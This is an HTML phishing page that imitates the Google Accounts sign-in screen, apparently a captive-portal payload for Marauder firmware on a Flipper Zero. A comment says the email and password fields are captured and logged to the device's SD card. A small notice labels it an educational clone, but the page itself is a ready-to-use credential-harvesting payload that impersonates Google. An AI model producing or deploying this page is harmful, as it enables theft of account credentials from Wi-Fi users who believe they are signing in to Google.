<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google Accounts</title>
  <style>
    * { box-sizing: border-box; font-family: "Google Sans", Roboto, Arial, sans-serif; }
    body {
      margin: 0;
      background: #fff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .card {
      width: 100%;
      max-width: 450px;
      margin: 24px;
      padding: 48px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
    }
    .logo {
      display: block;
      margin: 0 auto 16px;
      width: 75px;
    }
    h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 8px; }
    .subtitle { font-size: 16px; text-align: center; margin: 0 0 32px; }
    label { display: block; font-size: 12px; color: #5f6368; margin-bottom: 4px; }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 22px;
      outline: none;
    }
    input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
    .row { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
    .link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
    .btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 10px 24px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }
    .btn:hover { background: #1765cc; }
    .notice {
      max-width: 450px;
      margin: 12px 24px;
      padding: 10px 14px;
      font-size: 12px;
      color: #b00020;
      border: 1px dashed #b00020;
      border-radius: 4px;
      text-align: center;
    }
    footer { max-width: 450px; margin: 8px 24px; font-size: 12px; color: #5f6368; }
  </style>
</head>
<body>
  <div>
    <div class="card">
      <!-- Google "G" logo (inline SVG, no external calls) -->
      <svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>

      <h1>Sign in</h1>
      <p class="subtitle">Use your Google Account</p>

      <!-- Marauder captures these fields and logs them on the Flipper SD card -->
      <form action="/get" method="GET" autocomplete="off">
        <label for="email">Email or phone</label>
        <input type="email" id="email" name="email" required />

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required />

        <div class="row">
          <a class="link" href="#">Create account</a>
          <button class="btn" type="submit">Next</button>
        </div>
      </form>
    </div>

    <div class="notice">
      ⚠️ EDUCATIONAL CLONE — captive-portal demo payload. Not affiliated with Google. Do not enter real credentials.
    </div>
    <footer>English (United States) · Help · Privacy · Terms</footer>
  </div>
</body>
</html>
